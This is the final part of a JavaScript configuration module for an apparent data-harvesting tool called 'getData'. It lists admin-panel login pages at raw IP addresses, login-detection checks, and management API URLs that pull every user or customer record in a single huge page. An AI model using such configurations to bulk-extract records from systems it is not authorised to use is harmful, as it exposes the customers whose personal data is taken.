%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B12%5D%5Bdata%5D=createdAt&columns%5B12%5D%5Bname%5D=&columns%5B12%5D%5Bsearchable%5D=true&columns%5B12%5D%5Borderable%5D=true&columns%5B12%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B12%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B13%5D%5Bdata%5D=updatedAt&columns%5B13%5D%5Bname%5D=&columns%5B13%5D%5Bsearchable%5D=true&columns%5B13%5D%5Borderable%5D=true&columns%5B13%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B13%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&start=1&length=500000&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1539974352927"
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`id="sidebar-menu"`
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            name:["username","password"],
                        }
                    },
                    "h_47_98_99_208_8091":{
                        "url":"http://47.98.99.208:8091/login",
                        "dataSource":{
                            "allData":{
                                "description":"所有用户",
                                "url":`http://47.98.99.208:8091/api/mgmt/agents/customers?registBeginDate=2010-10-20&registBeginEnd=<%r%>toDayTimeA<%/r%>&pageNum=1&pageSize=1000000`
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            getURL: {
                                "url": `http://47.98.99.208:8091/api/mgmt/agents/optionalParents`,//用来请求判断是否登陆的URL
                                method:"POST",
                                callback: (data, callback) => {//请求后的回调,以便于判断是否登陆
                                    callback(true);
                                }//通过读取URL判断是否登陆
                            }
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            name:["username","password"],
                        }
                    }
				},
				software:{
					updateURL:"www.ddweb.com.cn/service/software/update.php?software_name=getData",
                    downURL:"www.ddweb.com.cn/service/software/update/getData"
				}
			}
		;

		return data;
	}
}

module.exports = C;